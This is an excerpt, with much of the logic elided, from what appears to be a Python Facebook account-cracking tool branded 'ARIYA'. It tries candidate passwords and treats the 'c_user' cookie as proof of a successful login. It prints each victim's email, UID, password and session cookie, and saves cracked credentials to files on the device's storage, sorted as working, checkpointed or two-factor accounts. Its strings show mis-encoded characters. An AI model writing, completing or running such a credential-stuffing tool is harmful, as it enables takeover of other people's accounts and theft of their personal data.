    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[âˆš]---------------------[ARIYA-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')

                cek_apk(session,coki)

                open('/sdcard/ARIYA-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r{Red}[Ã—]--------------------[ARIYA-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')

                open('/sdcard/ARIYA-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/ARIYA-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[ARIYA] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
